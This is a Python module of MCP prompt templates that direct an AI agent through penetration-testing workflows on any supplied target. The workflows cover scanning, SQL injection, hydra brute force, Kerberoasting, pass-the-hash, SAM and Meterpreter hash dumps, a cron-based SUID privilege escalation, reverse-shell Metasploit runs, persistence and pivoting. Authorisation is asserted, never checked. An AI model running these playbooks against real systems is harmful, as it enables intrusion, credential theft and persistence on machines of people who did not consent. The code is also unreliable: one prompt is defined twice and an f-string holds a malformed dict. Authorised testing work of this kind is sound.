"""
client/prompts.py
─────────────────
Register all @mcp.prompt handlers on a FastMCP instance.

Prompts are reusable instruction templates (playbooks) for common pentest
workflows.  Each prompt returns a string — the agent uses it as its
instruction set for that task.  Think of them as /slash commands.

Import and call register_prompts(mcp) from client.py.
"""

from mcp.server.fastmcp import FastMCP


def register_prompts(mcp: FastMCP) -> None:

    # -----------------------------------------------------------------------
    # Full reconnaissance
    # -----------------------------------------------------------------------
    @mcp.prompt(name="full_recon")
    def prompt_full_recon(target: str) -> str:
        """
        Full reconnaissance workflow for a single target.

        WHEN TO USE: Start of an engagement. Runs a broad sweep to map
        the attack surface before going deep on any single service.

        Args:
            target: IP address or hostname
        """
        return f"""
You are a penetration tester performing authorised reconnaissance on: {target}

Follow this methodology strictly and in order:

PHASE 1 — HOST DISCOVERY & PORT SCAN
  • Run nmap_scan on {target} with scan_type="-sCV" and additional_args="-T4 -Pn"
  • Note every open port and service version returned

PHASE 2 — SERVICE-SPECIFIC ENUMERATION
  Based on open ports found in Phase 1:
  • Port 80 / 443 / 8080 → run nikto_scan AND gobuster_scan
  • Port 139 / 445       → run enum4linux_scan
  • Port 21              → run execute_shell("ftp -n {target}") to test anonymous login
  • Port 22              → note for potential hydra_attack later
  • Port 3306 / 5432     → note for potential sqlmap or hydra later

PHASE 3 — WEB DEEP DIVE (if web ports found)
  • If WordPress detected → run wpscan_analyze
  • Run gobuster_scan with mode="dir" on all web ports
  • Note any login pages, upload forms, or interesting directories

PHASE 4 — REPORT
  Summarise all findings in this format:
  ## Target: {target}
  ### Open Ports & Services
  ### Web Findings
  ### SMB / Windows Findings
  ### Potential Vulnerabilities (ranked by severity)
  ### Recommended Next Steps

Wait for each scan to complete before starting the next.
Never skip a phase — partial recon leads to missed vulnerabilities.
"""

    # -----------------------------------------------------------------------
    # Web penetration test
    # -----------------------------------------------------------------------
    @mcp.prompt(name="web_pentest")
    def prompt_web_pentest(url: str) -> str:
        """
        Focused web application penetration test workflow.

        WHEN TO USE: When you already know there's a web app on the target
        and want a thorough assessment of it specifically.

        Args:
            url: Full URL including scheme e.g. http://10.10.10.1
        """
        return f"""
You are a web application penetration tester. Your target is: {url}

Run the following in order:

STEP 1 — FINGERPRINT
  • nikto_scan on {url}
  • Look for: server version, dangerous files, misconfigs, outdated software

STEP 2 — CONTENT DISCOVERY
  • gobuster_scan on {url} with mode="dir", wordlist="/usr/share/wordlists/dirb/big.txt"
  • dirb_scan on {url} as a second pass with a different wordlist
  • Note: admin panels, backup files (.bak, .old), config files, upload dirs

STEP 3 — CMS DETECTION
  • If WordPress signs found → wpscan_analyze on {url} with additional_args="--enumerate vp,u"
  • If Joomla / Drupal → execute_shell with appropriate scanner

STEP 4 — INJECTION TESTING
  • sqlmap_scan on {url} — test GET parameters first
  • For any login forms found → sqlmap_scan with data="username=test&password=test"

STEP 5 — REPORT
  ## Web Assessment: {url}
  ### Technology Stack
  ### Discovered Paths & Files (categorised by risk)
  ### Vulnerabilities Found (Critical / High / Medium / Low)
  ### Evidence (tool output snippets)
  ### Remediation Recommendations
"""

    # -----------------------------------------------------------------------
    # SMB enumeration
    # -----------------------------------------------------------------------
    @mcp.prompt(name="smb_enumeration")
    def prompt_smb_enumeration(target: str) -> str:
        """
        Deep SMB / Windows enumeration workflow.

        WHEN TO USE: When nmap shows ports 139 or 445 open. Common in
        CTF machines and internal network pentests.

        Args:
            target: IP address of the Windows / Samba host
        """
        return f"""
You are enumerating a Windows / Samba target at: {target}

STEP 1 — SMB ENUMERATION
  • enum4linux_scan on {target} with additional_args="-a"
  • Extract: OS info, users, shares, password policy, domain info

STEP 2 — SHARE ACCESS
  • execute_command("smbclient -L //{target} -N") — list shares anonymously
  • For each readable share: execute_command("smbclient //{target}/SHARENAME -N -c 'ls'")

STEP 3 — USER ENUMERATION
  • Note all usernames found in Step 1
  • These can be used with hydra_attack for password attacks

STEP 4 — VULNERABILITY CHECK
  • execute_command("nmap --script smb-vuln* -p 445 {target}")
  • Check for: EternalBlue (MS17-010), EternalRomance, SMBGhost

STEP 5 — REPORT
  ## SMB Enumeration: {target}
  ### OS & Version
  ### Users Found
  ### Shares & Access Level
  ### Vulnerabilities
  ### Recommended Exploits
"""

    # -----------------------------------------------------------------------
    # Explain tool output
    # -----------------------------------------------------------------------
    @mcp.prompt(name="explain_output")
    def prompt_explain_output(tool: str, output: str) -> str:
        """
        Explain what a tool's output means in plain English.

        WHEN TO USE: After running a scan and you want the agent to
        interpret the raw output — what it means, what's critical, what to do next.

        Args:
            tool:   Name of the tool that produced the output e.g. "nmap"
            output: Raw output text from the tool
        """
        return f"""
You are a senior penetration tester reviewing tool output.

Tool used: {tool}

Raw output:
{output}

Please provide:

1. SUMMARY
   What did this scan find in plain English? (2-3 sentences max)

2. KEY FINDINGS
   List each significant finding with:
   - What it is
   - Why it matters from a security perspective
   - Severity: Critical / High / Medium / Low / Info

3. ATTACK VECTORS
   Based on these findings, what are the most promising attack paths?

4. RECOMMENDED NEXT STEPS
   What specific tools or commands should be run next, and why?

5. FALSE POSITIVE CHECK
   Flag anything in the output that might be a false positive and explain why.

Be specific. Reference actual values from the output (ports, versions, paths).
Do not hallucinate findings that are not in the output above.
"""

    # -----------------------------------------------------------------------
    # CTF helper
    # -----------------------------------------------------------------------
    @mcp.prompt(name="ctf_helper")
    def prompt_ctf_helper(target: str, ctf_platform: str = "HackTheBox") -> str:
        """
        CTF / lab machine solving workflow.

        WHEN TO USE: Working through a HackTheBox, TryHackMe, or similar
        lab machine. Follows the standard CTF methodology.

        Args:
            target:       IP address of the machine
            ctf_platform: Platform name for context e.g. HackTheBox, TryHackMe
        """
        return f"""
You are helping solve a {ctf_platform} machine at IP: {target}

This is an authorised lab environment. Follow this CTF methodology:

PHASE 1 — ENUMERATION (most important phase)
  • nmap_scan: scan_type="-sCV", ports="", additional_args="-T4 -Pn --min-rate 5000"
  • Run ALL relevant service scanners based on what nmap finds
  • Do not skip any open port — CTF flags hide in unexpected services

PHASE 2 — FOOTHOLD
  • Based on enumeration, identify the most likely entry point
  • Common footholds: web exploits, default creds, public CVEs, file upload
  • Use the appropriate tool (sqlmap, metasploit, hydra, etc.)
  • Goal: get a shell (reverse shell or web shell)

PHASE 3 — USER FLAG
  • Once you have a shell: execute_command("find / -name user.txt 2>/dev/null")
  • Read the flag and report it

PHASE 4 — PRIVILEGE ESCALATION
  • execute_command("id && whoami && uname -a")
  • execute_command("sudo -l") — check sudo permissions
  • execute_command("find / -perm -4000 2>/dev/null") — find SUID binaries
  • Check /etc/crontab, writable paths, kernel version for known CVEs

PHASE 5 — ROOT FLAG
  • Once root: execute_command("find / -name root.txt 2>/dev/null")
  • Read the flag and report it

At each phase, explain your reasoning before running a tool.
If stuck, re-read all enumeration output — the answer is usually already there.
"""

    # -----------------------------------------------------------------------
    # Password attack
    # -----------------------------------------------------------------------
    @mcp.prompt(name="password_attack")
    def prompt_password_attack(target: str, service: str, usernames: str) -> str:
        """
        Structured password attack workflow.

        WHEN TO USE: You have a list of valid usernames and want to
        systematically attempt credential attacks.

        Args:
            target:    Target IP or hostname
            service:   Service to attack e.g. ssh, ftp, http-post-form
            usernames: Comma-separated list of known usernames
        """
        return f"""
You are performing an authorised credential attack.

Target:   {target}
Service:  {service}
Users:    {usernames}

STEP 1 — PREPARATION
  • Confirm the service is running: server_health or nmap_scan
  • Choose wordlist based on context:
    - Quick test:  /usr/share/wordlists/dirb/common.txt
    - Standard:    /usr/share/wordlists/rockyou.txt (14M passwords)
    - Targeted:    /usr/share/seclists/Passwords/probable-v2-top1575.txt

STEP 2 — ATTACK
  • hydra_attack with:
    - target = {target}
    - service = {service}
    - Try each username in: {usernames}
    - Start with password_file = /usr/share/wordlists/rockyou.txt
    - additional_args = "-W 3" (3s wait between attempts — avoids lockouts; -t is already set)

STEP 3 — IF HASHES AVAILABLE
  • john_crack with appropriate format_type
  • Common formats: md5crypt, sha512crypt, ntlm, bcrypt

STEP 4 — REPORT
  ## Credential Attack Results: {target} ({service})
  ### Valid Credentials Found
  ### Accounts Tested
  ### Lockout Policy (if detected)
  ### Recommendations (enforce MFA, stronger passwords, lockout policy)

Stop immediately if you detect an account lockout policy being triggered.
"""

    # -----------------------------------------------------------------------
    # Post-exploitation  [PRIORITY 6 — decision tree for post-shell phase]
    # -----------------------------------------------------------------------
    @mcp.prompt(name="post_exploitation")
    def prompt_post_exploitation(
        host: str,
        username: str,
        password: str = "",
        key_file: str = "",
        os_type: str = "linux"
    ) -> str:
        """
        Post-exploitation and privilege escalation workflow.

        WHEN TO USE: Immediately after getting a shell on a target.
        Covers shell stabilisation, automated enum, manual checks, and escalation.

        Args:
            host:     Compromised host IP
            username: Current user on the target
            password: SSH password (if available)
            key_file: Path to SSH key on Kali (if available)
            os_type:  "linux" or "windows"
        """
        auth = f"password='{password}'" if password else f"key_file='{key_file}'"

        if os_type.lower() == "windows":
            return f"""
You have a shell on a Windows target at {host} as user: {username}

Follow this post-exploitation methodology strictly:

STEP 1 — SITUATIONAL AWARENESS
  • ssh_command(host="{host}", username="{username}", {auth},
               command="whoami /all && net user && systeminfo | findstr /B /C:'OS' /C:'Domain'")
  • Note: current privileges, group memberships, OS version, domain membership

STEP 2 — AUTOMATED PRIVESC ENUM
  • run_linpeas(host="{host}", username="{username}", {auth}, script_type="winpeas")
  • Read the output carefully — focus on red/yellow highlighted findings

STEP 3 — TOKEN PRIVILEGES (most common CTF vector)
  • ssh_command(..., command="whoami /priv")
  • If SeImpersonatePrivilege is Enabled → use PrintSpoofer or GodPotato
  • searchsploit("PrintSpoofer") or searchsploit("GodPotato") for the right binary

STEP 4 — SERVICE MISCONFIGURATIONS
  • ssh_command(..., command="sc qc <suspicious_service>")
  • Look for services with writable binaries or unquoted paths
  • ssh_command(..., command="wmic service get name,pathname | findstr /i /v C:\\\\Windows")

STEP 5 — STORED CREDENTIALS
  • ssh_command(..., command="cmdkey /list")
  • ssh_command(..., command="dir /s /b *pass* *cred* *.config 2>nul")

STEP 6 — ESCALATE & GET FLAGS
  • Once SYSTEM: ssh_command(..., command="type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt")
  • Also check: ssh_command(..., command="type C:\\\\Users\\\\{username}\\\\Desktop\\\\user.txt")

STEP 7 — LATERAL MOVEMENT (if domain-joined)
  • crackmapexec(target="<domain_range>", username="{username}", password="<found_pass>")
  • If NT hash available: crackmapexec(..., hash_value="<ntlm_hash>", additional_args="--shares")
"""
        else:
            return f"""
You have a shell on a Linux target at {host} as user: {username}

Follow this post-exploitation methodology strictly:

STEP 1 — SITUATIONAL AWARENESS
  • ssh_command(host="{host}", username="{username}", {auth},
               command="id && whoami && uname -a && cat /etc/passwd | grep sh$")
  • Note: UID/GID, groups, kernel version, other users with shells

STEP 2 — AUTOMATED PRIVESC ENUM (do this first — it covers most of what follows)
  • run_linpeas(host="{host}", username="{username}", {auth})
  • Read carefully — focus on: SUID binaries, sudo permissions, cron jobs, writable paths

STEP 3 — SUDO PERMISSIONS  (most common CTF vector)
  • ssh_command(..., command="sudo -l")
  • If ANY binary shows NOPASSWD → check GTFOBins immediately
  • Especially: vim, python, perl, find, nmap, less, awk, bash, cp, mv

STEP 4 — SUID BINARIES
  • ssh_command(..., command="find / -perm -4000 -type f 2>/dev/null")
  • Cross-check every result against GTFOBins: https://gtfobins.github.io

STEP 5 — CRON JOBS
  • ssh_command(..., command="cat /etc/crontab && ls -la /etc/cron*")
  • If a cron script is writable: echo 'chmod +s /bin/bash' >> <script>
  • Wait for cron, then: bash -p

STEP 6 — KERNEL EXPLOITS (last resort)
  • ssh_command(..., command="uname -r")
  • searchsploit(query="Linux Kernel <version>")
  • Only use kernel exploits if all other vectors fail — they can crash the machine

STEP 7 — GET FLAGS
  • User flag:  ssh_command(..., command="find / -name user.txt 2>/dev/null | xargs cat")
  • Root flag:  ssh_command(..., command="find / -name root.txt 2>/dev/null | xargs cat")

Explain your reasoning at each step. If linpeas output is long, focus on the
sections highlighted in red first, then yellow.
"""

    # -----------------------------------------------------------------------
    # Exploit search workflow
    # -----------------------------------------------------------------------
    @mcp.prompt(name="exploit_search")
    def prompt_exploit_search(service: str, version: str) -> str:
        """
        Find and validate an exploit for a specific service and version.

        WHEN TO USE: After nmap identifies a service version and you need
        to find a working exploit for it.

        Args:
            service: Service name e.g. "vsftpd", "Apache", "OpenSSH", "Samba"
            version: Version string e.g. "2.3.4", "2.4.49", "7.6p1"
        """
        return f"""
You are searching for an exploit targeting: {service} {version}

Follow this workflow in order:

STEP 1 — OFFLINE EXPLOIT DATABASE SEARCH
  • searchsploit(query="{service} {version}")
  • Also try: searchsploit(query="{service}")  (broader — catches nearby versions)
  • Note the EDB-ID and module path of any promising results

STEP 2 — METASPLOIT MODULE CHECK
  • If searchsploit returns a Metasploit module path:
    metasploit_run(module="<path>", options={{"RHOSTS": "<target>"}})
  • Search for the module: execute_command("msfconsole -q -x 'search {service}; exit'")

STEP 3 — EVALUATE RESULTS
  For each exploit found, assess:
  - Remote vs local (remote = more valuable for initial access)
  - Authenticated vs unauthenticated (unauth = better)
  - Reliability (check the Rank in msf — Excellent > Great > Good > Normal)
  - CVE number (note for reporting)

STEP 4 — EXPLOITATION
  • If a reliable Metasploit module exists and requires only a single run:
    metasploit_run(module="<path>", options={"RHOSTS": "<target>", "LHOST": "<your_ip>", "LPORT": 4444})
  • If the exploit opens a session or needs interaction (handler, post modules, session commands):
    msf_console(commands=["use <path>", "set RHOSTS <target>", "set LHOST <your_ip>", "set LPORT 4444", "run"])
  • If a standalone script:
    execute_command("python3 <exploit_path> <target>")

STEP 5 — POST-EXPLOITATION (if exploit succeeds)
  • Use the post_exploitation prompt to continue
  • Or: ssh_command to run specific commands on the target

Report the CVE, exploit used, and whether it was authenticated or unauthenticated.
"""

    # -----------------------------------------------------------------------
    # Metasploit interactive session walkthrough
    # -----------------------------------------------------------------------
    @mcp.prompt(name="msf_session")
    def prompt_msf_session(target: str, module: str, lhost: str, lport: str = "4444") -> str:
        """
        Walk through a full Metasploit exploitation and session interaction flow.

        WHEN TO USE: When you need to exploit a target with Metasploit AND
        interact with the resulting session — not just fire and forget.

        Args:
            target: Target IP or hostname
            module: Metasploit module path e.g. exploit/unix/ftp/vsftpd_234_backdoor
            lhost:  Your tun0/attack IP
            lport:  Listener port (default 4444)
        """
        return f"""
You are running a Metasploit exploitation chain against: {target}
Module: {module}
LHOST:  {lhost}  LPORT: {lport}

Use msf_console with an ordered commands list. Never use metasploit_run for
flows that require session interaction — it cannot read back session output.

STEP 1 — CONFIGURE AND EXPLOIT
  msf_console(
    commands=[
      "use {module}",
      "set RHOSTS {target}",
      "set LHOST {lhost}",
      "set LPORT {lport}",
      "show options",      # verify before firing
      "run"
    ],
    step_timeout=60        # increase if the exploit is slow
  )

STEP 2 — CHECK FOR OPEN SESSIONS
  msf_console(commands=["sessions"], step_timeout=15)
  • If sessions list is empty → the exploit did not land, revisit module choice
  • If a session is open → note the session ID (e.g. 1)

STEP 3 — INTERACT WITH THE SESSION
  For a shell session:
    msf_console(commands=["sessions -i 1", "whoami", "id", "hostname"], step_timeout=20)

  For a Meterpreter session:
    msf_console(
      commands=["sessions -i 1", "getuid", "sysinfo", "getpid",
                "getsystem",          # attempt auto privesc
                "hashdump"],          # dump hashes if SYSTEM
      step_timeout=30
    )

STEP 4 — POST MODULES (optional)
  msf_console(
    commands=[
      "background",
      "use post/multi/recon/local_exploit_suggester",
      "set SESSION 1",
      "run"
    ],
    step_timeout=120
  )

STEP 5 — PERSIST OR PIVOT (if needed)
  • Persistence: use post/linux/manage/sshkey_persistence or post/windows/manage/persistence
  • Pivot:       route add <subnet> 1  then use auxiliary/server/socks_proxy

Always call msf_console with step_timeout high enough for slow operations.
Background a session with "background" before running post modules.
"""

    # -----------------------------------------------------------------------
    # Metasploit interactive session walkthrough
    # -----------------------------------------------------------------------
    @mcp.prompt(name="msf_session")
    def prompt_msf_session(target: str, module: str, lhost: str, lport: str = "4444") -> str:
        """
        Walk through a full Metasploit exploitation and session interaction flow.

        WHEN TO USE: When you need to exploit a target with Metasploit AND
        interact with the resulting session — not just fire and forget.

        Args:
            target: Target IP or hostname
            module: Metasploit module path e.g. exploit/unix/ftp/vsftpd_234_backdoor
            lhost:  Your tun0/attack IP
            lport:  Listener port (default 4444)
        """
        return f"""
You are running a Metasploit exploitation chain against: {target}
Module: {module}
LHOST:  {lhost}  LPORT: {lport}

Use msf_console with an ordered commands list. Never use metasploit_run for
flows that require session interaction — it cannot read back session output.

STEP 1 — CONFIGURE AND EXPLOIT
  msf_console(
    commands=[
      "use {module}",
      "set RHOSTS {target}",
      "set LHOST {lhost}",
      "set LPORT {lport}",
      "show options",      # verify before firing
      "run"
    ],
    step_timeout=60        # increase if the exploit is slow
  )

STEP 2 — CHECK FOR OPEN SESSIONS
  msf_console(commands=["sessions"], step_timeout=15)
  • If sessions list is empty → the exploit did not land, revisit module choice
  • If a session is open → note the session ID (e.g. 1)

STEP 3 — INTERACT WITH THE SESSION
  For a shell session:
    msf_console(commands=["sessions -i 1", "whoami", "id", "hostname"], step_timeout=20)

  For a Meterpreter session:
    msf_console(
      commands=["sessions -i 1", "getuid", "sysinfo", "getpid",
                "getsystem",          # attempt auto privesc
                "hashdump"],          # dump hashes if SYSTEM
      step_timeout=30
    )

STEP 4 — POST MODULES (optional)
  msf_console(
    commands=[
      "background",
      "use post/multi/recon/local_exploit_suggester",
      "set SESSION 1",
      "run"
    ],
    step_timeout=120
  )

STEP 5 — PERSIST OR PIVOT (if needed)
  • Persistence: use post/linux/manage/sshkey_persistence or post/windows/manage/persistence
  • Pivot:       route add <subnet> 1  then use auxiliary/server/socks_proxy

Always call msf_console with step_timeout high enough for slow operations.
Background a session with "background" before running post modules.
"""

    # -----------------------------------------------------------------------
    # Active Directory
    # -----------------------------------------------------------------------
    @mcp.prompt(name="active_directory")
    def prompt_active_directory(dc_ip: str, domain: str, username: str = "", password: str = "") -> str:
        """
        Active Directory enumeration and attack workflow.

        WHEN TO USE: When you're on a domain-joined network or have initial
        AD credentials and want to escalate privileges or move laterally.

        Args:
            dc_ip:    Domain Controller IP
            domain:   AD domain name e.g. "corp.local"
            username: Initial AD username (leave empty for unauthenticated)
            password: Initial AD password
        """
        creds = f"{username}:{password}@{domain}" if username else f"(unauthenticated) @{domain}"

        return f"""
You are attacking Active Directory.

Domain Controller: {dc_ip}
Domain:            {domain}
Credentials:       {creds}

PHASE 1 — INITIAL ENUMERATION
  {"• crackmapexec(target='" + dc_ip + "', protocol='smb', username='" + username + "', password='" + password + "')" if username else "• crackmapexec(target='" + dc_ip + "', protocol='smb')  — null session check"}
  • enum4linux_scan(target="{dc_ip}")
  • Note: domain users, groups, shares, password policy

PHASE 2 — SMB SHARE ENUMERATION
  • crackmapexec(target="{dc_ip}", username="{username}", password="{password}",
                additional_args="--shares")
  • For each readable share: smbclient_interact(target="{dc_ip}", share="<name>",
                             username="{username}", password="{password}")
  • Look for: scripts, configs, password files, GPOs

PHASE 3 — KERBEROASTING (if authenticated)
  • execute_command("GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -outputfile /tmp/spns.txt")
  • hashcat_crack(hash_file="/tmp/spns.txt", hash_type="13100")  — crack TGS tickets

PHASE 4 — AS-REP ROASTING (accounts with no pre-auth)
  • execute_command("GetNPUsers.py {domain}/ -dc-ip {dc_ip} -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
  • hashcat_crack(hash_file="/tmp/asrep.txt", hash_type="18200")

PHASE 5 — PASS-THE-HASH / LATERAL MOVEMENT
  • If you have an NTLM hash:
    crackmapexec(target="<range>", username="<user>", hash_value="<ntlm>",
                additional_args="-x 'whoami'")
  • Check which hosts you're local admin on (look for Pwn3d! in output)

PHASE 6 — ESCALATE TO DOMAIN ADMIN
  • If local admin on any host: dump SAM/LSA → find DA creds
    crackmapexec(target="<host>", username, password/hash, additional_args="--sam")
  • Check BloodHound paths: execute_command("bloodhound-python -u {username} -p {password} -d {domain} -dc {dc_ip} -c all")

PHASE 7 — FLAGS
  • DC flags are usually at: \\\\{dc_ip}\\C$\\Users\\Administrator\\Desktop\\root.txt
    smbclient_interact(target="{dc_ip}", share="C$", username="Administrator",
                      smb_command="get Users/Administrator/Desktop/root.txt /tmp/root.txt")

Report every user and hash found. Document the full attack chain.
"""
